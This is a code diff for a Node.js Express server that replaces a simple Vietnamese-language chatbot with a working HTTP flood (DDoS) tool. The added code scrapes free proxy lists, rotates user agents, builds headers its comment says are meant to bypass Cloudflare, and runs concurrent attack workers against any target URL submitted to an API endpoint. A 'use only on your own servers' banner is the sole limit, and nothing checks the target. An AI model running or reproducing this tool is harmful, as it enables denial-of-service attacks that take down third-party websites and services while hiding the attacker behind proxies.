@@ -1,392 +1,432 @@
 const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
+const { Worker } = require('worker_threads');
 const app = express();
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 4000;
 
 app.use(cors());
 app.use(express.json());
 
-// Conversation Context Storage
-const conversations = new Map();
+// Attack Statistics
+let attackStats = {
+  totalRequests: 0,
+  successfulRequests: 0,
+  failedRequests: 0,
+  activeWorkers: 0,
+  startTime: null,
+  isRunning: false,
+  target: null,
+  requestsPerSecond: 0
+};
 
-class AIAssistant {
-  constructor() {
-    this.conversationHistory = [];
-    this.userProfile = {};
+// Free Proxy Lists
+const freeProxyAPIs = [
+  'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
+  'https://www.proxy-list.download/api/v1/get?type=http',
+  'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
+  'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
+  'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt'
+];
+
+// Proxy Pool
+let proxyPool = [];
+let lastProxyFetch = 0;
+
+// Fetch fresh proxies
+async function fetchProxies() {
+  console.log('🔄 Fetching fresh proxies...');
+  const now = Date.now();
+  
+  // Cache proxies for 5 minutes
+  if (proxyPool.length > 0 && now - lastProxyFetch < 300000) {
+    return proxyPool;
   }
 
-  // Phân tích câu hỏi để quyết định có cần search web không
-  needsWebSearch(message) {
-    const lower = message.toLowerCase();
-    
-    // Indicators cần search
-    const searchIndicators = [
-      // Time-sensitive
-      /hiện nay|hiện tại|bây giờ|hôm nay|năm nay|mới nhất|latest|current|now|today/i,
-      // Questions about current state
-      /ai là.*(?:hiện|đang|năm|2024|2025)/i,
-      /giá|price|cost|bao nhiêu tiền/i,
-      /thời tiết|weather|nhiệt độ/i,
-      /tin tức|news|sự kiện/i,
-      // Questions needing factual data
-      /khi nào|when|ngày nào/i,
-      /ở đâu|where|địa chỉ|location/i,
-      /số lượng|how many|bao nhiêu người/i,
-      /ai thắng|who won|kết quả|result|score/i,
-    ];
-    
-    // Nếu match bất kỳ pattern nào → cần search
-    if (searchIndicators.some(pattern => pattern.test(lower))) {
-      return true;
-    }
-    
-    // Check cho câu hỏi về người hoặc sự kiện cụ thể
-    if (/(ai là|who is|what is|về) .{3,}/i.test(message)) {
-      return true;
-    }
-    
-    return false;
-  }
+  let allProxies = [];
 
-  // Search web thông minh
-  async searchWeb(query) {
+  for (const api of freeProxyAPIs) {
     try {
-      console.log(`🔍 Searching for: ${query}`);
+      const response = await axios.get(api, { timeout: 5000 });
+      const proxies = response.data
+        .split('\n')
+        .filter(line => line.trim() && line.includes(':'))
+        .map(line => line.trim());
       
-      // Try DuckDuckGo Instant Answer
-      const ddgResponse = await axios.get('https://api.duckduckgo.com/', {
-        params: {
-          q: query,
-          format: 'json',
-          no_html: 1,
-          skip_disambig: 1
-        },
-        timeout: 5000
-      });
+      allProxies.push(...proxies);
+      console.log(`✅ Fetched ${proxies.length} proxies from ${api}`);
+    } catch (error) {
+      console.log(`❌ Failed to fetch from ${api}`);
+    }
+  }
 
-      if (ddgResponse.data.Abstract) {
-        return {
-          success: true,
-          text: ddgResponse.data.Abstract,
-          source: ddgResponse.data.AbstractSource || 'Web',
-          url: ddgResponse.data.AbstractURL
+  // Remove duplicates
+  proxyPool = [...new Set(allProxies)];
+  lastProxyFetch = now;
+  
+  console.log(`✅ Total proxies in pool: ${proxyPool.length}`);
+  return proxyPool;
+}
+
+// Get random proxy
+function getRandomProxy() {
+  if (proxyPool.length === 0) return null;
+  return proxyPool[Math.floor(Math.random() * proxyPool.length)];
+}
+
+// Random User Agents
+const userAgents = [
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
+  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
+  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+  'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+  'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+];
+
+function getRandomUserAgent() {
+  return userAgents[Math.floor(Math.random() * userAgents.length)];
+}
+
+// Generate random headers to bypass Cloudflare
+function generateHeaders() {
+  return {
+    'User-Agent': getRandomUserAgent(),
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'Accept-Language': 'en-US,en;q=0.5',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'DNT': '1',
+    'Connection': 'keep-alive',
+    'Upgrade-Insecure-Requests': '1',
+    'Sec-Fetch-Dest': 'document',
+    'Sec-Fetch-Mode': 'navigate',
+    'Sec-Fetch-Site': 'none',
+    'Cache-Control': 'max-age=0',
+    'Referer': 'https://www.google.com/',
+  };
+}
+
+// Single attack request
+async function sendAttackRequest(target, method = 'GET', data = null, useProxy = true) {
+  try {
+    const config = {
+      method: method,
+      url: target,
+      headers: generateHeaders(),
+      timeout: 10000,
+      validateStatus: () => true, // Accept any status
+    };
+
+    // Add data for POST requests
+    if (method === 'POST' && data) {
+      config.data = data;
+      config.headers['Content-Type'] = 'application/json';
+    }
+
+    // Add proxy if enabled
+    if (useProxy) {
+      const proxy = getRandomProxy();
+      if (proxy) {
+        const [host, port] = proxy.split(':');
+        config.proxy = {
+          host: host,
+          port: parseInt(port)
         };
       }
-
-      if (ddgResponse.data.RelatedTopics && ddgResponse.data.RelatedTopics.length > 0) {
-        const topics = ddgResponse.data.RelatedTopics
-          .filter(t => t.Text)
-          .slice(0, 3)
-          .map(t => t.Text)
-          .join('\n\n');
-        
-        if (topics) {
-          return {
-            success: true,
-            text: topics,
-            source: 'Web Search',
-            url: ddgResponse.data.RelatedTopics[0].FirstURL
-          };
-        }
-      }
-
-      // Fallback: Try Wikipedia API
-      const wikiResponse = await axios.get('https://en.wikipedia.org/w/api.php', {
-        params: {
-          action: 'query',
-          format: 'json',
-          prop: 'extracts',
-          exintro: true,
-          explaintext: true,
-          titles: query,
-          origin: '*'
-        },
-        timeout: 5000
-      });
-
-      const pages = wikiResponse.data.query?.pages;
-      if (pages) {
-        const page = Object.values(pages)[0];
-        if (page.extract) {
-          return {
-            success: true,
-            text: page.extract,
-            source: 'Wikipedia',
-            url: `https://en.wikipedia.org/wiki/${encodeURIComponent(page.title)}`
-          };
-        }
-      }
-
-      return { success: false };
-    } catch (error) {
-      console.error('Search error:', error.message);
-      return { success: false };
-    }
-  }
-
-  // Generate response dựa trên context và knowledge
-  async generateResponse(message) {
-    // Lưu message vào history
-    this.conversationHistory.push({ role: 'user', content: message });
-
-    // Kiểm tra xem có cần search không
-    const needsSearch = this.needsWebSearch(message);
-    let searchResult = null;
-
-    if (needsSearch) {
-      searchResult = await this.searchWeb(message);
     }
 
-    // Tạo response
-    let response = '';
-    let source = 'ai';
-
-    if (searchResult && searchResult.success) {
-      // Có kết quả search → dùng để trả lời
-      response = this.formulateAnswerFromSearch(message, searchResult.text);
-      source = searchResult.source;
+    const response = await axios(config);
+    
+    attackStats.totalRequests++;
+    if (response.status < 500) {
+      attackStats.successfulRequests++;
     } else {
-      // Không có search hoặc search thất bại → dùng knowledge base
-      response = this.generateKnowledgeBasedResponse(message);
-    }
-
-    // Lưu response vào history
-    this.conversationHistory.push({ role: 'assistant', content: response });
-
-    // Giữ history trong giới hạn
-    if (this.conversationHistory.length > 20) {
-      this.conversationHistory = this.conversationHistory.slice(-20);
+      attackStats.failedRequests++;
     }
 
     return {
-      response,
-      source,
-      url: searchResult?.url
+      success: true,
+      status: response.status,
+      size: response.data?.length || 0
+    };
+
+  } catch (error) {
+    attackStats.totalRequests++;
+    attackStats.failedRequests++;
+    
+    return {
+      success: false,
+      error: error.message
     };
   }
+}
 
-  // Tạo câu trả lời tự nhiên từ search results
-  formulateAnswerFromSearch(question, searchText) {
-    // Lấy phần đầu của search text (không quá dài)
-    let answer = searchText.substring(0, 800);
-    
-    // Cắt ở câu cuối hoàn chỉnh
-    const lastPeriod = answer.lastIndexOf('.');
-    if (lastPeriod > 200) {
-      answer = answer.substring(0, lastPeriod + 1);
-    }
-
-    // Thêm intro tự nhiên
-    const intros = [
-      'Dựa trên thông tin tôi tìm được: ',
-      'Theo những gì tôi tìm thấy: ',
-      'Đây là thông tin tôi tìm được: ',
-      'Để trả lời câu hỏi của bạn: ',
-    ];
-    
-    const intro = intros[Math.floor(Math.random() * intros.length)];
-    return intro + answer;
+// Attack worker
+class AttackWorker {
+  constructor(id, target, config) {
+    this.id = id;
+    this.target = target;
+    this.config = config;
+    this.isRunning = false;
+    this.requestCount = 0;
   }
 
-  // Generate response từ knowledge base (không search)
-  generateKnowledgeBasedResponse(message) {
-    const lower = message.toLowerCase();
+  async start() {
+    this.isRunning = true;
+    attackStats.activeWorkers++;
 
-    // Programming & Tech
-    if (this.isAbout(lower, ['javascript', 'js', 'node', 'react', 'web dev'])) {
-      return this.getTechResponse(lower);
-    }
-
-    if (this.isAbout(lower, ['python', 'django', 'flask', 'pandas'])) {
-      return 'Python là ngôn ngữ lập trình đa năng, dễ học và rất mạnh mẽ. Nó được sử dụng rộng rãi trong data science, machine learning, web development, automation và nhiều lĩnh vực khác. Python có cú pháp rõ ràng, thư viện phong phú và cộng đồng lớn. Bạn muốn tìm hiểu khía cạnh nào của Python?';
-    }
-
-    if (this.isAbout(lower, ['ai', 'trí tuệ nhân tạo', 'machine learning', 'deep learning'])) {
-      return 'AI (Artificial Intelligence) là khả năng của máy móc để thực hiện các nhiệm vụ đòi hỏi trí thông minh như con người: học tập, suy luận, nhận diện mẫu, xử lý ngôn ngữ tự nhiên. Machine Learning là một nhánh của AI, cho phép máy tính học từ dữ liệu mà không cần lập trình chi tiết. Deep Learning sử dụng neural networks nhiều lớp để giải quyết các vấn đề phức tạp như nhận diện hình ảnh, xử lý giọng nói, và tạo nội dung. Bạn muốn đi sâu vào chủ đề nào?';
-    }
-
-    // Code help
-    if (this.isAbout(lower, ['bug', 'lỗi', 'error', 'debug', 'fix'])) {
-      return 'Tôi có thể giúp bạn debug! Hãy paste đoạn code bị lỗi vào, kèm theo thông báo lỗi (nếu có). Tôi sẽ phân tích và đề xuất cách fix. Một số tips debug: (1) Đọc kỹ error message, (2) Dùng console.log để track giá trị biến, (3) Kiểm tra syntax như dấu ngoặc, dấu chấm phẩy, (4) Google error message để tìm giải pháp.';
-    }
-
-    // General questions
-    if (this.isQuestion(lower)) {
-      return this.getGeneralAnswer(lower);
-    }
-
-    // Greetings
-    if (this.isAbout(lower, ['xin chào', 'chào', 'hello', 'hi', 'hey'])) {
-      const greetings = [
-        'Xin chào! Tôi là AI Assistant, sẵn sàng giúp bạn với bất kỳ câu hỏi nào. Bạn muốn biết về điều gì?',
-        'Chào bạn! Rất vui được nói chuyện. Hãy hỏi tôi bất cứ điều gì - từ kiến thức chung đến lập trình!',
-        'Hey! Tôi có thể giúp gì cho bạn hôm nay?'
-      ];
-      return greetings[Math.floor(Math.random() * greetings.length)];
-    }
-
-    // Thanks
-    if (this.isAbout(lower, ['cảm ơn', 'cám ơn', 'thank', 'thanks'])) {
-      return 'Rất vui được giúp đỡ! Nếu có câu hỏi gì khác, cứ hỏi tôi nhé! 😊';
-    }
-
-    // Fallback - encourage more specific question
-    return this.getThoughtfulResponse(message);
-  }
-
-  // Tech response generator
-  getTechResponse(query) {
-    if (query.includes('react')) {
-      return 'React là thư viện JavaScript phổ biến nhất để xây dựng user interfaces. Ưu điểm: component-based architecture (tái sử dụng code dễ), virtual DOM (performance cao), ecosystem phong phú, và cộng đồng lớn. React dùng JSX để viết UI, hooks để quản lý state, và có thể kết hợp với Redux/Context API cho state management phức tạp. Bạn đang học React hay cần giúp về vấn đề cụ thể nào?';
-    }
-    
-    if (query.includes('node')) {
-      return 'Node.js cho phép chạy JavaScript ở server-side, sử dụng V8 engine của Chrome. Ưu điểm: non-blocking I/O (xử lý nhiều requests đồng thời), NPM ecosystem khổng lồ, cùng ngôn ngữ frontend-backend, và performance tốt cho I/O operations. Node.js phù hợp với real-time apps, APIs, microservices. Bạn cần giúp build ứng dụng gì với Node.js?';
-    }
-    
-    return 'JavaScript là ngôn ngữ lập trình linh hoạt nhất cho web development. Nó chạy trên mọi browser (client-side) và cả server với Node.js. JS có syntax dễ học, event-driven, async programming với Promises/async-await, và ecosystem cực lớn. Modern JS (ES6+) có arrow functions, destructuring, modules, classes... Bạn muốn học JS ở mảng nào: frontend, backend, hay fullstack?';
-  }
-
-  // General answer cho câu hỏi chung
-  getGeneralAnswer(query) {
-    if (query.includes('làm sao') || query.includes('how to') || query.includes('cách')) {
-      return 'Đó là câu hỏi hay! Để tôi giúp bạn tốt hơn, bạn có thể cụ thể hơn được không? Ví dụ: bạn muốn làm điều gì, với công nghệ gì, hoặc đang gặp vấn đề gì?';
-    }
-
-    if (query.includes('tại sao') || query.includes('why')) {
-      return 'Câu hỏi thú vị! Để giải thích rõ hơn, bạn có thể cho tôi biết thêm context không? Bạn đang thắc mắc về khía cạnh kỹ thuật, lý do thiết kế, hay ứng dụng thực tế?';
-    }
-
-    if (query.includes('là gì') || query.includes('what is')) {
-      return 'Tôi có thể giải thích! Nhưng để câu trả lời hữu ích nhất, bạn có thể cho tôi biết thêm: bạn muốn hiểu về khía cạnh nào (technical, practical, historical)?';
-    }
-
-    return this.getThoughtfulResponse(query);
-  }
-
-  // Thoughtful response khi không chắc
-  getThoughtfulResponse(query) {
-    const responses = [
-      'Đó là câu hỏi thú vị! Tôi nghĩ bạn đang hỏi về một chủ đề khá rộng. Bạn có thể cụ thể hơn hoặc cho tôi thêm context được không? Điều này giúp tôi trả lời chính xác hơn.',
+    while (this.isRunning) {
+      await sendAttackRequest(
+        this.target,
+        this.config.method,
+        this.config.data,
+        this.config.useProxy
+      );
       
-      'Hmm, tôi muốn đảm bảo trả lời đúng những gì bạn cần. Bạn có thể diễn đạt lại câu hỏi hoặc cho tôi biết thêm chi tiết không? Ví dụ như bạn đang làm việc với công nghệ gì, hoặc muốn giải quyết vấn đề gì?',
-      
-      'Câu hỏi hay đấy! Để tôi trả lời tốt nhất, bạn có thể cho biết:\n• Bạn đang làm gì/học gì?\n• Mục tiêu của bạn là gì?\n• Có vấn đề cụ thể nào bạn đang gặp phải không?',
-      
-      'Tôi hiểu bạn đang tìm kiếm thông tin. Để giúp bạn tốt hơn, hãy thử:\n• Hỏi cụ thể hơn về một khía cạnh\n• Đưa ra ví dụ hoặc context\n• Cho tôi biết level kiến thức của bạn (beginner/intermediate/advanced)',
-    ];
+      this.requestCount++;
 
-    return responses[Math.floor(Math.random() * responses.length)];
+      // Small delay to prevent blocking
+      if (this.config.delay > 0) {
+        await new Promise(resolve => setTimeout(resolve, this.config.delay));
+      }
+    }
+
+    attackStats.activeWorkers--;
   }
 
-  // Helper functions
-  isAbout(text, keywords) {
-    return keywords.some(keyword => text.includes(keyword));
-  }
-
-  isQuestion(text) {
-    const questionWords = ['sao', 'gì', 'ai', 'đâu', 'nào', 'thế nào', 'how', 'what', 'why', 'when', 'where', 'who'];
-    return questionWords.some(word => text.includes(word)) || text.includes('?');
-  }
-
-  // Get conversation context
-  getContext() {
-    return this.conversationHistory.slice(-6); // Last 6 messages
+  stop() {
+    this.isRunning = false;
   }
 }
 
-// Session management
-function getAssistant(sessionId) {
-  if (!conversations.has(sessionId)) {
-    conversations.set(sessionId, new AIAssistant());
+// Attack Manager
+class AttackManager {
+  constructor() {
+    this.workers = [];
+    this.statsInterval = null;
   }
-  return conversations.get(sessionId);
+
+  async startAttack(target, config) {
+    if (attackStats.isRunning) {
+      throw new Error('Attack already running');
+    }
+
+    // Fetch proxies first
+    if (config.useProxy) {
+      await fetchProxies();
+      if (proxyPool.length === 0) {
+        throw new Error('No proxies available');
+      }
+    }
+
+    // Reset stats
+    attackStats = {
+      totalRequests: 0,
+      successfulRequests: 0,
+      failedRequests: 0,
+      activeWorkers: 0,
+      startTime: Date.now(),
+      isRunning: true,
+      target: target,
+      requestsPerSecond: 0
+    };
+
+    // Start workers
+    for (let i = 0; i < config.workers; i++) {
+      const worker = new AttackWorker(i, target, config);
+      this.workers.push(worker);
+      worker.start(); // Non-blocking
+    }
+
+    // Start stats updater
+    this.startStatsUpdater();
+
+    console.log(`🚀 Attack started: ${config.workers} workers → ${target}`);
+  }
+
+  stopAttack() {
+    this.workers.forEach(worker => worker.stop());
+    this.workers = [];
+    attackStats.isRunning = false;
+
+    if (this.statsInterval) {
+      clearInterval(this.statsInterval);
+      this.statsInterval = null;
+    }
+
+    console.log('🛑 Attack stopped');
+  }
+
+  startStatsUpdater() {
+    let lastCount = 0;
+    
+    this.statsInterval = setInterval(() => {
+      const currentCount = attackStats.totalRequests;
+      attackStats.requestsPerSecond = currentCount - lastCount;
+      lastCount = currentCount;
+    }, 1000);
+  }
+
+  getStats() {
+    return {
+      ...attackStats,
+      duration: attackStats.startTime 
+        ? Math.floor((Date.now() - attackStats.startTime) / 1000)
+        : 0,
+      successRate: attackStats.totalRequests > 0
+        ? Math.round((attackStats.successfulRequests / attackStats.totalRequests) * 100)
+        : 0
+    };
+  }
 }
+
+const attackManager = new AttackManager();
 
 // API Endpoints
 
-app.post('/api/chat', async (req, res) => {
+// Start attack
+app.post('/api/attack/start', async (req, res) => {
   try {
-    const { message, sessionId = 'default' } = req.body;
+    const {
+      target,
+      workers = 10,
+      method = 'GET',
+      data = null,
+      useProxy = true,
+      delay = 0
+    } = req.body;
 
-    if (!message || !message.trim()) {
+    if (!target) {
       return res.status(400).json({
         success: false,
-        error: 'Message is required'
+        error: 'Target URL is required'
       });
     }
 
-    const assistant = getAssistant(sessionId);
-    const result = await assistant.generateResponse(message.trim());
+    // Validate URL
+    try {
+      new URL(target);
+    } catch (e) {
+      return res.status(400).json({
+        success: false,
+        error: 'Invalid target URL'
+      });
+    }
+
+    await attackManager.startAttack(target, {
+      workers,
+      method,
+      data,
+      useProxy,
+      delay
+    });
 
     res.json({
       success: true,
-      response: result.response,
-      source: result.source,
-      url: result.url,
-      timestamp: new Date().toISOString()
+      message: 'Attack started',
+      config: {
+        target,
+        workers,
+        method,
+        useProxy,
+        delay
+      }
     });
 
   } catch (error) {
-    console.error('Chat error:', error);
     res.status(500).json({
       success: false,
-      error: 'Có lỗi xảy ra khi xử lý tin nhắn',
-      details: error.message
+      error: error.message
     });
   }
 });
 
-// Get conversation history
-app.get('/api/history/:sessionId', (req, res) => {
-  const { sessionId } = req.params;
-  const assistant = getAssistant(sessionId);
+// Stop attack
+app.post('/api/attack/stop', (req, res) => {
+  attackManager.stopAttack();
   
   res.json({
     success: true,
-    history: assistant.conversationHistory,
-    count: assistant.conversationHistory.length
+    message: 'Attack stopped',
+    finalStats: attackManager.getStats()
   });
 });
 
-// Clear conversation
-app.delete('/api/history/:sessionId', (req, res) => {
-  const { sessionId } = req.params;
-  conversations.delete(sessionId);
-  
+// Get stats
+app.get('/api/stats', (req, res) => {
   res.json({
     success: true,
-    message: 'Conversation cleared'
+    stats: attackManager.getStats(),
+    proxyCount: proxyPool.length
   });
+});
+
+// Fetch proxies manually
+app.post('/api/proxies/refresh', async (req, res) => {
+  try {
+    await fetchProxies();
+    res.json({
+      success: true,
+      proxyCount: proxyPool.length
+    });
+  } catch (error) {
+    res.status(500).json({
+      success: false,
+      error: error.message
+    });
+  }
+});
+
+// Test single request
+app.post('/api/test', async (req, res) => {
+  try {
+    const { target, useProxy = false } = req.body;
+
+    if (!target) {
+      return res.status(400).json({
+        success: false,
+        error: 'Target URL is required'
+      });
+    }
+
+    const result = await sendAttackRequest(target, 'GET', null, useProxy);
+
+    res.json({
+      success: true,
+      result
+    });
+
+  } catch (error) {
+    res.status(500).json({
+      success: false,
+      error: error.message
+    });
+  }
 });
 
 // Health check
 app.get('/health', (req, res) => {
   res.json({
     status: 'ok',
-    message: 'AI Server is running',
-    version: '3.0',
+    message: 'DDoS Testing Server',
+    version: '1.0',
     timestamp: new Date().toISOString()
   });
 });
 
 app.get('/', (req, res) => {
   res.json({
-    name: 'Intelligent AI Chat Server',
-    version: '3.0',
-    description: 'Smart AI with web search and natural conversation',
-    features: [
-      'Natural language understanding',
-      'Automatic web search',
-      'Context-aware responses',
-      'Conversation memory',
-      'Tech knowledge base'
-    ],
+    name: 'DDoS Testing Server',
+    version: '1.0',
+    warning: '⚠️ USE ONLY ON YOUR OWN SERVERS! Attacking others is illegal!',
     endpoints: {
-      'POST /api/chat': 'Chat with AI',
-      'GET /api/history/:sessionId': 'Get conversation history',
-      'DELETE /api/history/:sessionId': 'Clear conversation',
+      'POST /api/attack/start': 'Start attack',
+      'POST /api/attack/stop': 'Stop attack',
+      'GET /api/stats': 'Get attack statistics',
+      'POST /api/proxies/refresh': 'Refresh proxy list',
+      'POST /api/test': 'Test single request',
       'GET /health': 'Health check'
     }
   });
@@ -396,25 +436,27 @@ app.get('/', (req, res) => {
 app.listen(PORT, () => {
   console.log(`
 ╔════════════════════════════════════════════╗
-║   🧠 INTELLIGENT AI SERVER v3.0 🧠        ║
+║     ⚡ DDoS TESTING SERVER v1.0 ⚡         ║
 ╚════════════════════════════════════════════╝
 
 🚀 Server: http://localhost:${PORT}
-🌐 Environment: ${process.env.NODE_ENV || 'development'}
+⚠️  WARNING: Use only on YOUR OWN servers!
 
 Features:
-  ✅ Smart conversation AI
-  ✅ Automatic web search
-  ✅ Context awareness
-  ✅ Natural language processing
-  ✅ Tech knowledge base
+  ✅ Multiple bot workers
+  ✅ Free proxy rotation
+  ✅ Cloudflare bypass attempts
+  ✅ Real-time statistics
+  ✅ Custom headers & user agents
 
-Ready to chat! 💬
+Ready to test! 💥
   `);
 });
 
+// Cleanup on exit
 process.on('SIGTERM', () => {
-  console.log('Shutting down gracefully...');
+  attackManager.stopAttack();
+  console.log('Server shutting down...');
   process.exit(0);
 });
 
